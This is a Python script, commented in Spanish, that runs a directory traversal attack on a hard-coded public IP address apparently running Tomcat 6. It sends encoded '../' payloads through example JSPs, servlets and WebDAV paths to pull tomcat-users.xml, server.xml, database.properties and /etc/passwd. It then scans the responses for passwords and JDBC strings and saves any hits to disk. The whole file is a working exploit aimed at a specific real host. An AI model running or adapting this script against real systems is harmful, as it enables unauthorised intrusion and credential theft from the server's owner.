# real_traversal.py
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class RealTraversal:
    def __init__(self):
        self.base_url = "https://189.254.143.102"
        self.session = requests.Session()
        self.session.verify = False
        
    def try_different_traversal_methods(self):
        """Prueba diferentes métodos de Directory Traversal"""
        print("=== DIRECTORY TRAVERSAL REAL ===")
        
        # Métodos basados en vulnerabilidades específicas de Tomcat 6
        methods = [
            self.try_include_jsp,
            self.try_snoop_jsp,
            self.try_calendar_jsp,
            self.try_request_param,
            self.try_webdav
        ]
        
        for method in methods:
            method()
    
    def try_include_jsp(self):
        """Usa include.jsp que es más probable que funcione"""
        print("\n[+] Probando include.jsp...")
        
        target_files = [
            "/conf/tomcat-users.xml",
            "/conf/server.xml",
            "/webapps/SITO/WEB-INF/web.xml",
            "/webapps/SITO/WEB-INF/classes/database.properties",
            "/windows/system32/drivers/etc/hosts",
            "/etc/passwd"
        ]
        
        for target_file in target_files:
            # Diferentes parámetros y encodings
            payloads = [
                f"../../../../..{target_file}",
                f"....//....//....//....//....//{target_file}",
                f"..\\..\\..\\..\\..{target_file.replace('/', '\\')}",
                f"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{target_file}"
            ]
            
            for payload in payloads:
                url = f"{self.base_url}/examples/jsp/include/include.jsp?page={payload}"
                try:
                    response = self.session.get(url, timeout=10)
                    self.analyze_response(response, f"include.jsp - {target_file}")
                except:
                    pass
    
    def try_snoop_jsp(self):
        """Intenta extraer el contenido real del archivo"""
        print("\n[+] Probando snoop.jsp con diferentes parámetros...")
        
        # El problema es que snoop.jsp solo muestra info de la request, no el archivo
        # Necesitamos encontrar un parámetro que lea el archivo
        params = ["file", "filename", "path", "page", "include", "source"]
        
        for param in params:
            payload = "../../../../../../conf/tomcat-users.xml"
            url = f"{self.base_url}/examples/jsp/snp/snoop.jsp?{param}={payload}"
            try:
                response = self.session.get(url, timeout=10)
                # Buscar contenido XML en la respuesta
                if "<?xml" in response.text or "<tomcat-users>" in response.text:
                    print(f"  ✅ CONTENIDO ENCONTRADO con parámetro: {param}")
                    self.save_content(response.text, f"snoop_{param}_tomcat-users.xml")
            except:
                pass
    
    def try_calendar_jsp(self):
        """Usa calendar.jsp que puede ser vulnerable"""
        print("\n[+] Probando calendar.jsp...")
        
        url = f"{self.base_url}/examples/jsp/cal/calendar.jsp"
        payloads = [
            "?time=../../../../../../conf/tomcat-users.xml",
            "?date=../../../../../../conf/tomcat-users.xml",
            "?file=../../../../../../conf/tomcat-users.xml"
        ]
        
        for payload in payloads:
            try:
                response = self.session.get(url + payload, timeout=10)
                self.analyze_response(response, "calendar.jsp")
            except:
                pass
    
    def try_request_param(self):
        """Usa RequestParamExample servlet"""
        print("\n[+] Probando servlets...")
        
        servlets = [
            "/examples/servlets/servlet/RequestParamExample",
            "/examples/servlets/servlet/SessionExample"
        ]
        
        for servlet in servlets:
            url = f"{self.base_url}{servlet}"
            # Probar diferentes parámetros
            params = {
                "param": "../../../../../../conf/tomcat-users.xml",
                "file": "../../../../../../conf/tomcat-users.xml",
                "input": "../../../../../../conf/tomcat-users.xml"
            }
            
            try:
                response = self.session.get(url, params=params, timeout=10)
                self.analyze_response(response, servlet)
            except:
                pass
    
    def try_webdav(self):
        """Intenta acceder via WebDAV"""
        print("\n[+] Probando WebDAV...")
        
        webdav_paths = [
            "/webdav/conf/tomcat-users.xml",
            "/webdav/../conf/tomcat-users.xml",
            "/webdav/../../conf/tomcat-users.xml"
        ]
        
        for path in webdav_paths:
            url = f"{self.base_url}{path}"
            try:
                response = self.session.get(url, timeout=10)
                self.analyze_response(response, "WebDAV")
            except:
                pass
    
    def analyze_response(self, response, source):
        """Analiza si la respuesta contiene datos útiles"""
        content = response.text
        
        # Patrones que indican éxito
        success_indicators = [
            ("tomcat-users", "ARCHIVO DE USUARIOS"),
            ("server.xml", "CONFIGURACIÓN SERVER"),
            ("password", "CONTRASEÑA"),
            ("jdbc:", "CONEXIÓN BD"),
            ("<?xml", "ARCHIVO XML"),
            ("root:", "USUARIO ROOT"),
            ("<user", "USUARIO TOMCAT")
        ]
        
        for pattern, description in success_indicators:
            if pattern.lower() in content.lower():
                print(f"  ✅ {description} ENCONTRADO en {source}")
                print(f"     URL: {response.url}")
                print(f"     Contenido: {content[:200]}...")
                
                # Guardar contenido prometedor
                filename = f"success_{source.replace('/', '_')}_{hash(pattern)}.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(f"URL: {response.url}\n")
                    f.write(f"Source: {source}\n")
                    f.write(f"Pattern: {pattern}\n")
                    f.write(f"Content:\n{content}\n")
                
                return True
        
        # Si es una respuesta larga pero no es la página de error estándar
        if len(content) > 1000 and "Request Information" not in content:
            print(f"  ⚠️  Respuesta interesante de {source} ({len(content)} bytes)")
            return True
            
        return False
    
    def save_content(self, content, filename):
        """Guarda contenido importante"""
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(content)
        print(f"    💾 Guardado como: {filename}")

# Ejecutar
if __name__ == "__main__":
    traversal = RealTraversal()
    traversal.try_different_traversal_methods()